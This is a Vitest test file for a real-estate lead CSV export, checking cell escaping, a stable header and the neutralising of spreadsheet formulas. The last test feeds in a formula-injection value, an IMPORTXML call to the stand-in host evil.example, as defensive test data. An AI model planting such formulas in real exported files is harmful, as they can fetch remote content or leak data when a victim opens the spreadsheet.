import { describe, expect, it } from "vitest";
import { csvCell, leadsToCsv, type LeadExportRow } from "@/lib/lead-export";

describe("lead CSV export", () => {
  it("escapes CSV cells", () => {
    expect(csvCell('Maya "Winnipeg", buyer')).toBe('"Maya ""Winnipeg"", buyer"');
    expect(csvCell("line\nbreak")).toBe("line break");
  });

  it("renders leads with a stable header", () => {
    const lead: LeadExportRow = {
      created_at: "2026-06-16T00:00:00Z",
      name: "Maya",
      email: "maya@example.com",
      phone: null,
      status: "qualified",
      temperature: "hot",
      intent: "buyer",
      score: 92,
      location: "Winnipeg",
      timeframe: "1 month",
      budget_min: null,
      budget_max: 1000000,
      property_type: "house",
      property_address: null,
      source_label: "Hosted link",
      source: "hosted",
      medium: "link",
      campaign: null,
      term: null,
      assigned_agent_profile_id: null,
      summary: "Buyer lead",
    };
    const csv = leadsToCsv([lead]);
    expect(csv).toContain("created_at,name,email");
    expect(csv).toContain("Maya,maya@example.com");
    expect(csv).toContain("1000000");
  });
});

it("neutralizes spreadsheet formulas in exported cells", () => {
  expect(csvCell('=IMPORTXML("https://evil.example")')).toBe(`"'=IMPORTXML(""https://evil.example"")"`);
  expect(csvCell("+12045550123")).toBe("'+12045550123");
});
